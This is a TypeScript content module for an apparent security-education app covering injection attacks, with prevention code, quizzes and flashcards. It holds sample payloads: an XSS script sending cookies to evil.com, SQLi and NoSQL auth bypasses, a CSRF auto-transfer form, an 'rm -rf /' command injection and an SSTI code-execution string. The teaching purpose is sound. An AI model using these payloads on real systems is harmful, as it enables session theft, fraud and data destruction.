import type { TopicContent } from "../types";

export const injectionAttacks: TopicContent = {
  quickSummary: [
    "Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query, tricking it into executing unintended operations like data theft, modification, or system compromise.",
    "SQL injection (SQLi) manipulates database queries by inserting malicious SQL through user inputs, preventable primarily through parameterized queries and prepared statements.",
    "Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other users — stored XSS persists in the database, reflected XSS bounces off the server, and DOM-based XSS executes entirely client-side.",
    "Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unwanted actions by exploiting the browser's automatic cookie inclusion on cross-origin requests.",
  ],
  detailed: [
    `## SQL Injection (SQLi)

SQL injection occurs when user input is concatenated into SQL queries without proper sanitization, allowing attackers to alter query logic.

**Classic example:**
\`\`\`sql
-- Vulnerable query
SELECT * FROM users WHERE username = '{input}' AND password = '{password}';

-- Attacker input: username = ' OR '1'='1' --
-- Resulting query:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';
-- The OR '1'='1' is always true, and -- comments out the password check
\`\`\`

**Types of SQLi:**
- **In-band (Classic)**: Results are returned directly in the response. Includes UNION-based (extracting data via UNION SELECT) and error-based (extracting info from error messages).
- **Blind SQLi**: No direct output. Boolean-based (observing true/false behavior differences) or time-based (using SLEEP/WAITFOR to infer data).
- **Out-of-band**: Data exfiltrated via DNS or HTTP requests from the database server.

**Prevention:**
- Parameterized queries / prepared statements (primary defense)
- ORM usage with parameterized methods
- Input validation (allow-list for expected formats)
- Least privilege database accounts
- WAF as defense in depth (not primary)`,

    `## Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages, executing in the context of other users' browsers.

**Stored (Persistent) XSS:** Malicious script is permanently stored on the server (database, message forum, comment field). Every user who views the affected page executes the script. Most dangerous type.

\`\`\`html
<!-- Attacker posts a comment containing: -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- All users viewing the page execute this script -->
\`\`\`

**Reflected XSS:** The script is part of the request (URL parameter, form field) and reflected back in the response. Requires tricking the victim into clicking a crafted link.

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

**DOM-based XSS:** The vulnerability exists in client-side JavaScript that processes data from an attacker-controllable source (location.hash, postMessage) and writes it to a dangerous sink (innerHTML, eval, document.write).

**Prevention:**
- Output encoding/escaping for the specific context (HTML, JS, CSS, URL)
- Content Security Policy (CSP) headers restricting inline scripts
- Use frameworks with automatic escaping (React, Angular, Vue)
- Sanitize HTML input with libraries like DOMPurify
- HttpOnly cookies prevent script access to session tokens`,

    `## Cross-Site Request Forgery (CSRF)

CSRF exploits the browser's behavior of automatically sending cookies with every request to a domain. An attacker tricks an authenticated user into making unintended requests.

**Attack scenario:**
\`\`\`html
<!-- Attacker's page includes a hidden form that auto-submits -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- When a logged-in bank user visits this page, the transfer executes
     because the browser sends the bank.com session cookie automatically -->
\`\`\`

**Prevention:**
- **CSRF tokens**: Server generates a unique, unpredictable token per session/request, embedded in forms and validated server-side. The attacker cannot know this token.
- **SameSite cookies**: \`SameSite=Strict\` or \`SameSite=Lax\` prevents cookies from being sent on cross-origin requests.
- **Double submit cookie**: Send the CSRF token both as a cookie and a request parameter; the server verifies they match.
- **Origin/Referer header validation**: Check that requests come from your own domain.
- Custom request headers (X-Requested-With) — browsers enforce CORS preflight for custom headers on cross-origin requests.`,

    `## Other Injection Types

**NoSQL Injection:** Targets NoSQL databases like MongoDB where query operators can be injected.
\`\`\`javascript
// Vulnerable: user sends {"$gt": ""} as password
db.users.find({ username: input.username, password: input.password });
// Becomes: find where password > "" (always true)
\`\`\`
Prevention: validate input types, use MongoDB's \`$eq\` operator explicitly, avoid passing raw user objects to queries.

**OS Command Injection:** Occurs when user input is passed to system shell commands.
\`\`\`javascript
// Vulnerable
exec("ping " + userInput);
// Attacker input: "8.8.8.8; rm -rf /"
\`\`\`
Prevention: avoid shell commands entirely, use language-native libraries, if unavoidable use parameterized APIs and strict input validation.

**LDAP Injection:** Manipulates LDAP queries used for directory lookups and authentication.

**Template Injection (SSTI):** Server-side template engines (Jinja2, Twig, Freemarker) can execute arbitrary code if user input is embedded in templates without sanitization.

**Header Injection / HTTP Response Splitting:** Injecting newline characters into HTTP headers to add malicious headers or split the response.`,

    `## Defense in Depth Strategy

No single defense is sufficient. Layer multiple protections:

1. **Input validation** — Validate type, length, format, and range. Use allow-lists over deny-lists. Reject unexpected input rather than trying to sanitize it.

2. **Parameterized queries** — For SQL, NoSQL, LDAP, and OS commands. Separates code from data at the interpreter level.

3. **Output encoding** — Encode data for the specific output context: HTML entity encoding for HTML content, JavaScript encoding for JS contexts, URL encoding for URLs, CSS encoding for style contexts.

4. **Content Security Policy** — Restrict script sources, disable inline scripts and eval. This is a strong second line of defense against XSS even if output encoding is missed.

5. **Least privilege** — Database accounts should have minimal permissions. Application should not run as root.

6. **WAF (Web Application Firewall)** — Detects and blocks common injection patterns. Useful as a safety net but should never be the primary defense.

7. **Security testing** — Automated SAST/DAST tools, manual penetration testing, and code review. Tools like SQLMap, Burp Suite, and OWASP ZAP help identify vulnerabilities.`,
  ],
  interviewQA: [
    {
      q: "What is the difference between stored, reflected, and DOM-based XSS?",
      a: "Stored XSS persists on the server (e.g., in a database comment) and executes for every user who views the page — most dangerous. Reflected XSS is included in the request (URL/form) and reflected in the response — requires the victim to click a crafted link. DOM-based XSS never touches the server — the vulnerability is in client-side JavaScript that reads from an attacker-controllable source (like location.hash) and writes to a dangerous sink (innerHTML, eval). Prevention differs: stored/reflected require server-side output encoding, while DOM-based requires securing client-side data flow and avoiding dangerous sinks.",
    },
    {
      q: "Why are parameterized queries the primary defense against SQL injection rather than input sanitization?",
      a: "Parameterized queries separate SQL code structure from data at the database engine level. The query template is compiled first, then user data is bound as parameters that can never alter the query structure — regardless of content. Input sanitization, by contrast, tries to identify and remove dangerous characters, but it's error-prone: different databases have different escape sequences, encoding tricks can bypass filters, and complex inputs may be partially sanitized. Parameterized queries provide a fundamental architectural guarantee, while sanitization is a heuristic that can be bypassed.",
    },
    {
      q: "How does SameSite cookie attribute prevent CSRF?",
      a: "SameSite controls whether cookies are sent on cross-origin requests. With SameSite=Strict, the cookie is never sent on any cross-site request — even following a link from an external site to your app won't include the cookie. SameSite=Lax allows the cookie on top-level GET navigations (so links work) but blocks it on POST requests, form submissions from other sites, and embedded content (iframes, images). Since CSRF attacks rely on the browser automatically sending auth cookies with cross-origin form submissions or AJAX requests, SameSite=Lax or Strict prevents the attack at the browser level.",
    },
  ],
  followUps: [
    "Why is parameterisation categorically different from escaping?",
    "How do you safely handle a user-supplied ORDER BY column, which can't be parameterised?",
    "What's the equivalent risk in a NoSQL query, or in a template engine?",
  ],
  mcqs: [
    {
      q: "Which type of SQL injection extracts data by observing differences in application behavior (e.g., true/false responses)?",
      options: [
        "Union-based SQLi",
        "Error-based SQLi",
        "Boolean-based blind SQLi",
        "Out-of-band SQLi",
      ],
      answerIndex: 2,
      explanation:
        "Boolean-based blind SQLi infers data by sending queries that produce observable true/false differences in the application's response, without directly seeing query results.",
    },
    {
      q: "Which XSS type is considered most dangerous because it affects all users who view the affected page?",
      options: [
        "Reflected XSS",
        "DOM-based XSS",
        "Stored (Persistent) XSS",
        "Self-XSS",
      ],
      answerIndex: 2,
      explanation:
        "Stored XSS persists on the server and executes every time any user views the affected page, making it the most dangerous variant as it requires no victim interaction beyond normal browsing.",
    },
    {
      q: "What is the primary purpose of a CSRF token?",
      options: [
        "To encrypt form data",
        "To prove the request originated from the application's own form, not a third-party site",
        "To authenticate the user's identity",
        "To prevent SQL injection",
      ],
      answerIndex: 1,
      explanation:
        "CSRF tokens are unique, unpredictable values embedded in forms that prove the request came from the application itself. An attacker on a different origin cannot read or guess this token.",
    },
    {
      q: "Which defense is most effective against DOM-based XSS?",
      options: [
        "Server-side input validation",
        "Content Security Policy with no inline scripts",
        "Avoiding dangerous JavaScript sinks like innerHTML and eval",
        "CSRF tokens",
      ],
      answerIndex: 2,
      explanation:
        "DOM-based XSS occurs entirely in client-side JavaScript. Avoiding dangerous sinks (innerHTML, eval, document.write) and using safe alternatives (textContent, createElement) is the most effective defense.",
    },
  ],
  flashcards: [
    {
      front: "What is the difference between in-band and blind SQL injection?",
      back: "In-band SQLi returns results directly in the response (via UNION SELECT or error messages). Blind SQLi produces no visible output — the attacker infers data through behavioral differences (boolean-based) or timing delays (time-based using SLEEP).",
    },
    {
      front: "What are the three types of XSS?",
      back: "Stored (persists in server/database, executes for all viewers), Reflected (included in request, bounced back in response), DOM-based (vulnerability in client-side JS, never reaches the server).",
    },
    {
      front: "How do CSRF attacks work?",
      back: "An attacker creates a page with a hidden form/request targeting a victim site. When an authenticated user visits the attacker's page, the browser automatically includes the victim site's cookies, executing the forged request with the user's privileges.",
    },
    {
      front: "What is Content Security Policy (CSP)?",
      back: "An HTTP header that restricts which resources a page can load. By disabling inline scripts (script-src 'self') and eval, CSP provides strong defense against XSS even when output encoding is missed.",
    },
    {
      front: "Why is allow-listing better than deny-listing for input validation?",
      back: "Deny-lists try to block known bad patterns but miss new attack vectors, encoding tricks, and edge cases. Allow-lists define exactly what is acceptable (format, type, range), rejecting everything else — a much stronger security posture.",
    },
    {
      front: "What is Server-Side Template Injection (SSTI)?",
      back: "An attack where user input is embedded directly into a server-side template engine (Jinja2, Twig), allowing the attacker to execute arbitrary code on the server. Example: {{7*7}} rendering as 49 indicates SSTI vulnerability.",
    },
    {
      front: "What is the double submit cookie pattern for CSRF prevention?",
      back: "The server sets a random CSRF token as a cookie AND requires the same value in a request header/body. The server verifies both match. Attackers can trigger the cookie to be sent but cannot read it (due to same-origin policy) to include it in the request body.",
    },
  ],
  resources: [
    {
      label: "OWASP SQL Injection Prevention Cheat Sheet",
      kind: "docs",
    },
    {
      label: "PortSwigger Web Security Academy — SQL injection",
      kind: "docs",
    },
  ],
  glossary: [
    {
      term: "SQL Injection (SQLi)",
      definition:
        "An attack that inserts malicious SQL code into application queries via user input, exploiting the mixing of code and data in dynamically constructed queries.",
    },
    {
      term: "Cross-Site Scripting (XSS)",
      definition:
        "An attack that injects malicious client-side scripts into web pages viewed by other users, enabling session hijacking, defacement, or redirection.",
    },
    {
      term: "CSRF (Cross-Site Request Forgery)",
      definition:
        "An attack that tricks an authenticated user's browser into sending unintended requests to a web application, exploiting automatic cookie inclusion.",
    },
    {
      term: "Parameterized Query",
      definition:
        "A query where the SQL structure is defined separately from user data, with placeholders that the database engine fills without allowing the data to alter the query logic.",
    },
    {
      term: "Output Encoding",
      definition:
        "Converting special characters to their safe equivalents for a specific output context (HTML entities, JS escapes, URL encoding) to prevent injection when displaying user data.",
    },
    {
      term: "Content Security Policy (CSP)",
      definition:
        "An HTTP response header that specifies which content sources are allowed, providing a browser-enforced defense against XSS and data injection attacks.",
    },
    {
      term: "Blind Injection",
      definition:
        "An injection attack variant where results are not directly visible, requiring the attacker to infer information through behavioral differences or timing side channels.",
    },
  ],
  deepDive: [
    `**Injection attacks** remain the *most critical* class of web application vulnerabilities, consistently ranking in the **OWASP Top 10**. At their core, every injection flaw shares a single root cause: *untrusted data crossing a trust boundary* into an **interpreter** — whether that interpreter is a \`SQL\` engine, a \`JavaScript\` runtime, an \`OS shell\`, or even an \`LDAP\` directory parser. The attacker's payload is *indistinguishable* from legitimate code because the application **concatenates** user input directly into executable statements. Understanding this shared anatomy is essential: once you see that \`SQL injection\`, \`XSS\`, \`command injection\`, and \`template injection\` are all *instances of the same design flaw*, you can apply a **universal mitigation pattern** — separate *code* from *data* at every interpreter boundary.`,

    `**Parameterized queries** and **prepared statements** are the gold standard for SQL injection prevention because they enforce a *structural separation* at the database driver level. When you write \`db.query("SELECT * FROM users WHERE id = ?", [userId])\`, the \`?\` placeholder tells the database engine: "compile this query structure *first*, then bind the parameter as **pure data**." No matter what \`userId\` contains — even \`' OR 1=1 --\` — it is *never* parsed as SQL syntax. This is fundamentally different from **escaping** or **sanitizing**, which attempt to *transform* dangerous characters but can be defeated by *double encoding*, \`Unicode\` tricks, or database-specific escape sequences. For **XSS prevention**, the equivalent principle is *contextual output encoding*: use \`textContent\` instead of \`innerHTML\`, employ frameworks like **React** that auto-escape by default, and deploy a strict \`Content-Security-Policy\` header with \`script-src 'self'\` to block inline scripts as a **defense-in-depth** layer.`,

    `Modern applications face *evolving injection vectors* that go beyond classic \`SQLi\` and \`XSS\`. **NoSQL injection** exploits the *operator-based query syntax* of databases like \`MongoDB\`, where passing \`{"$gt": ""}\` as a password field bypasses authentication. **Server-Side Template Injection (SSTI)** targets engines like \`Jinja2\` or \`Pug\`, turning a seemingly harmless \`{{user_input}}\` into **remote code execution** via payloads like \`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\`. **GraphQL injection** manipulates *deeply nested queries* to cause **denial of service** or extract unauthorized data through *introspection*. The **defense-in-depth** approach demands multiple layers: *input validation* (allow-list, not deny-list), **parameterized interfaces** at every interpreter boundary, *output encoding* matched to the rendering context, \`WAF\` rules as a safety net, and regular **penetration testing** with tools like \`SQLMap\`, \`Burp Suite\`, and \`OWASP ZAP\` to catch what static analysis misses.`,
  ],
  code: [
    {
      language: "cpp",
      caption: "Parameterized SQL query in C++ using SQLite to prevent SQL injection",
      source: `#include <sqlite3.h>
#include <string>
#include <iostream>

// SAFE: Using parameterized query to prevent SQL injection
bool authenticateUser(sqlite3* db, const std::string& username, const std::string& password) {
    const char* sql = "SELECT id FROM users WHERE username = ? AND password_hash = ?";
    sqlite3_stmt* stmt = nullptr;

    // Prepare the statement — SQL structure is compiled first
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        return false;
    }

    // Bind parameters as DATA, never as executable SQL
    sqlite3_bind_text(stmt, 1, username.c_str(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, password.c_str(), -1, SQLITE_TRANSIENT);

    bool authenticated = (sqlite3_step(stmt) == SQLITE_ROW);
    sqlite3_finalize(stmt);
    return authenticated;
}

// VULNERABLE — never do this:
// std::string sql = "SELECT id FROM users WHERE username = '" + username + "'";`,
    },
    {
      language: "javascript",
      caption: "Preventing XSS and NoSQL injection in a Node.js Express application",
      source: `const express = require('express');
const helmet = require('helmet');
const mongoSanitize = require('express-mongo-sanitize');
const { body, validationResult } = require('express-validator');

const app = express();
app.use(express.json());

// Set security headers including Content-Security-Policy
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],       // No inline scripts allowed
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
    },
  },
}));

// Strip MongoDB operators like $gt, $ne from user input
app.use(mongoSanitize());

// SAFE: Validate and sanitize input, use parameterized queries
app.post('/api/login',
  body('username').isAlphanumeric().trim().escape(),
  body('password').isLength({ min: 8 }),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // Use explicit $eq operator to prevent operator injection
    const user = await db.collection('users').findOne({
      username: { $eq: req.body.username },
    });

    if (!user || !(await bcrypt.compare(req.body.password, user.passwordHash))) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    res.json({ token: generateJWT(user) });
  }
);`,
    },
    {
      language: "cpp",
      caption: "Safe OS command execution in C++ avoiding command injection",
      source: `#include <array>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <regex>

// SAFE: Validate input strictly, then use execvp (no shell involved)
#include <unistd.h>
#include <sys/wait.h>

bool isValidHostname(const std::string& input) {
    // Allow-list: only alphanumeric, dots, and hyphens
    static const std::regex hostnamePattern("^[a-zA-Z0-9][a-zA-Z0-9.\\-]{0,253}[a-zA-Z0-9]$");
    return std::regex_match(input, hostnamePattern);
}

int safePing(const std::string& host) {
    // Step 1: Strict input validation with allow-list
    if (!isValidHostname(host)) {
        throw std::invalid_argument("Invalid hostname format");
    }

    // Step 2: Use execvp instead of system() — no shell interpretation
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: exec directly, bypassing shell
        execlp("ping", "ping", "-c", "4", host.c_str(), nullptr);
        _exit(127); // exec failed
    }

    int status = 0;
    waitpid(pid, &status, 0);
    return WEXITSTATUS(status);
}

// VULNERABLE — never do this:
// system(("ping " + userInput).c_str());
// Attacker input: "8.8.8.8; rm -rf /" executes arbitrary commands`,
    },
  ],
  diagrams: [
    {
      title: "SQL Injection Attack Flow",
      kind: "sequence",
      caption: "How a SQL injection attack exploits unsanitized user input.",
      mermaid: `sequenceDiagram
    participant Attacker
    participant App
    participant DB
    Attacker->>App: Input: ' OR '1'='1
    App->>App: Concatenate into SQL string
    App->>DB: SELECT * FROM users WHERE id='' OR '1'='1'
    DB->>DB: Condition always true
    DB-->>App: Return all user records
    App-->>Attacker: All user data exposed
    Note over App: Parameterized queries prevent this`,
    },
    {
      title: "Injection Defense Layers",
      kind: "flow",
      caption: "Layered defenses to prevent injection attacks at each layer.",
      mermaid: `flowchart TD
    A[User Input Received] --> B[Input Validation]
    B --> C{Valid format and type?}
    C -- No --> D[Reject with 400 error]
    C -- Yes --> E[Use Parameterized Query or ORM]
    E --> F[Apply Least Privilege DB user]
    F --> G[WAF Web Application Firewall]
    G --> H[Execute query safely]
    H --> I[Audit logging]`,
    },
    {
      title: "Injection Attack Types",
      kind: "mindmap",
      caption: "Common injection attack vectors targeting different interpreter types.",
      mermaid: `mindmap
  root((Injection Attacks))
    SQL Injection
      Classic string concat
      Blind boolean-based
      Error-based
    Command Injection
      OS shell commands
      Backtick execution
    LDAP Injection
      Directory queries
      Auth bypass
    XSS Cross-Site Scripting
      Stored persistent
      Reflected
      DOM-based
    XXE XML External Entities
      Local file disclosure
      SSRF via XML
    Template Injection
      SSTI Jinja2 Twig
      Code execution`,
    },
    {
      title: "Defense in Depth Architecture",
      kind: "architecture",
      caption: "Layered security architecture protecting against injection attacks.",
      mermaid: `graph TD
    Request --> WAF[WAF Rate Limiting]
    WAF --> Valid[Input Validation Layer]
    Valid --> Param[Parameterized Queries]
    Param --> ORM[ORM Prepared Statements]
    ORM --> PoLP[Least Privilege DB Account]
    PoLP --> Audit[Audit Logging]
    Audit --> DB[(Database)]`,
    },
  ],
  animations: [
    {
      title: "Why concatenation breaks and parameterisation doesn't",
      steps: [
        {
          label: "Concatenated query",
          detail: "`\"SELECT * FROM users WHERE email = '\" + input + \"'\"`. The value becomes part of the query text.",
        },
        {
          label: "Malicious input",
          detail: "The user submits `' OR '1'='1`. The query now reads `... WHERE email = '' OR '1'='1'` — every row matches.",
        },
        {
          label: "Why it worked",
          detail: "The database parsed code and data together, so data was able to change the query's structure.",
        },
        {
          label: "Parameterised query",
          detail: "`SELECT * FROM users WHERE email = ?` is parsed first, with the structure fixed.",
        },
        {
          label: "Value bound",
          detail: "The input is supplied separately as data. Whatever it contains, it can never become syntax.",
        },
        {
          label: "Defence in depth",
          detail: "The app's database user has no DROP or schema rights, so a future gap is contained.",
        },
      ],
    },
  ],
  comparison: {
    columns: [
      "Attack Type",
      "Target",
      "Injection Point",
      "Impact",
      "Primary Defense",
    ],
    rows: [
      [
        "**SQL Injection**",
        "*Database engine*",
        "`SQL` queries via user input fields",
        "Data theft, modification, deletion, auth bypass",
        "Parameterized queries / prepared statements",
      ],
      [
        "**Stored XSS**",
        "*Client browser*",
        "Persistent data (comments, profiles) rendered as `HTML`",
        "Session hijacking, defacement, malware distribution",
        "Output encoding + `CSP` headers",
      ],
      [
        "**Reflected XSS**",
        "*Client browser*",
        "URL parameters / form fields reflected in response",
        "Phishing, session theft (requires victim click)",
        "Output encoding + input validation",
      ],
      [
        "**DOM-based XSS**",
        "*Client-side JS*",
        "`location.hash`, `postMessage`, client-side sources",
        "Same as XSS but entirely client-side",
        "Avoid dangerous sinks (`innerHTML`, `eval`)",
      ],
      [
        "**CSRF**",
        "*Authenticated session*",
        "Cross-origin forged requests with auto-sent cookies",
        "Unauthorized actions on behalf of the user",
        "`CSRF` tokens + `SameSite` cookies",
      ],
      [
        "**NoSQL Injection**",
        "*NoSQL database*",
        "Query operators (`$gt`, `$ne`) in `JSON` input",
        "Auth bypass, data exfiltration",
        "Input type validation + explicit `$eq` operator",
      ],
      [
        "**Command Injection**",
        "*OS shell*",
        "User input passed to `system()` or `exec()`",
        "Full system compromise, **RCE**",
        "Avoid shell; use `execvp` / language-native APIs",
      ],
      [
        "**SSTI**",
        "*Template engine*",
        "User input in server-side templates (`Jinja2`, `Pug`)",
        "Remote code execution on the server",
        "Sandboxed templates + input validation",
      ],
    ],
  },
  exercises: [
    "**Identify the vulnerability**: Given the Node.js code `db.query('SELECT * FROM products WHERE category = \\'' + req.query.cat + '\\'')`  , explain *why* it is vulnerable to **SQL injection**, write a *malicious input* that dumps all rows, and refactor the code to use a **parameterized query** with `?` placeholders.",
    "**Build a CSP header**: Write a `Content-Security-Policy` header that allows scripts *only* from your own origin, blocks all `inline scripts` and `eval()`, allows images from your origin and `data:` URIs, and disallows all `object`/`embed` elements. Then explain how this policy would *mitigate* a **stored XSS** payload like `<script>alert(1)</script>` injected into a comment field.",
    "**Implement CSRF protection**: Design a *middleware function* in **Express.js** that generates a **CSRF token** using `crypto.randomBytes()`, stores it in the session, embeds it as a hidden form field, and validates it on every `POST`/`PUT`/`DELETE` request. Explain why an attacker on a *different origin* cannot forge this token.",
    "**Exploit and fix NoSQL injection**: Given a `MongoDB` login endpoint that passes `req.body` directly to `db.collection('users').findOne(req.body)`, craft a **NoSQL injection** payload using the `$gt` operator to bypass authentication. Then fix the code using *input type checking*, the explicit `$eq` operator, and a library like `express-mongo-sanitize`.",
    "**Defense-in-depth audit**: Review a sample web application that uses *string concatenation* for SQL queries, renders user input with `innerHTML`, and has no `CSRF` tokens. List *every injection vulnerability* present, rank them by **severity**, and propose a **layered remediation plan** covering parameterized queries, output encoding, `CSP`, `SameSite` cookies, and `WAF` rules.",
  ],
  cheatSheet: [
    "**SQL Injection Prevention**: Always use *parameterized queries* (`?` or `$1` placeholders). Never concatenate user input into `SQL` strings. Use `ORM` methods that auto-parameterize. Apply **least privilege** to database accounts.",
    "**XSS Prevention**: Use *contextual output encoding* — `HTML` entities for content, `JS` escaping for scripts, `URL` encoding for hrefs. Prefer `textContent` over `innerHTML`. Deploy `Content-Security-Policy: script-src 'self'`. Use frameworks with *auto-escaping* (React, Angular).",
    "**CSRF Prevention**: Include a **unique CSRF token** in every state-changing form. Set cookies with `SameSite=Lax` or `Strict`. Validate `Origin` and `Referer` headers server-side. Use the *double submit cookie* pattern for stateless CSRF protection.",
    "**Input Validation**: Always use **allow-lists** (expected format, type, length) over deny-lists. Validate on the *server side* — client-side validation is easily bypassed. Reject invalid input rather than trying to *sanitize* it.",
    "**NoSQL Injection Prevention**: Never pass raw `req.body` to database queries. Use explicit `$eq` operators: `{ username: { $eq: input } }`. Strip query operators with `express-mongo-sanitize`. Validate *input types* (string, number) before querying.",
    "**Command Injection Prevention**: Avoid `system()`, `exec()`, and `child_process.exec()` with user input. Use *language-native APIs* instead of shell commands. If shell is unavoidable, use `execFile()` / `execvp()` (no shell interpretation) with **strict allow-list** validation on input.",
  ],
  revisionNotes: [
    "All injection attacks share one root cause: **untrusted data** is *interpreted as code* because the application fails to separate **data** from **instructions**. The universal fix is to use *parameterized interfaces* that keep user input as pure data at every interpreter boundary — `SQL`, `HTML`, `shell`, `LDAP`, or `template engine`.",
    "For **SQL injection**, the key distinction is between *in-band* (results visible directly), *blind* (inferred via `boolean` or `time-based` side channels), and *out-of-band* (data exfiltrated via `DNS`/`HTTP`). **Parameterized queries** are the *primary* defense; `WAF` and input validation are supplementary layers.",
    "For **XSS**, remember the three types: *Stored* (server-persisted, highest impact), *Reflected* (in the request/response cycle, requires victim click), and *DOM-based* (entirely client-side, target the `JS` data flow). Prevention requires **output encoding** matched to the *rendering context* plus `CSP` as a safety net.",
    "**CSRF** exploits *automatic cookie inclusion* by browsers. Defenses: **CSRF tokens** (server-generated, embedded in forms, validated on submission), `SameSite=Lax/Strict` cookies (browser-level block on cross-origin requests), and `Origin`/`Referer` header validation. `SameSite=Lax` is now the *default* in modern browsers.",
    "**Defense in depth** is non-negotiable: no single control is sufficient. Layer *input validation* (allow-list) + *parameterized queries* + *output encoding* + `CSP` headers + *least privilege* + `WAF` + regular **security testing** (`SAST`, `DAST`, pen testing). Each layer catches what the others miss.",
  ],
};
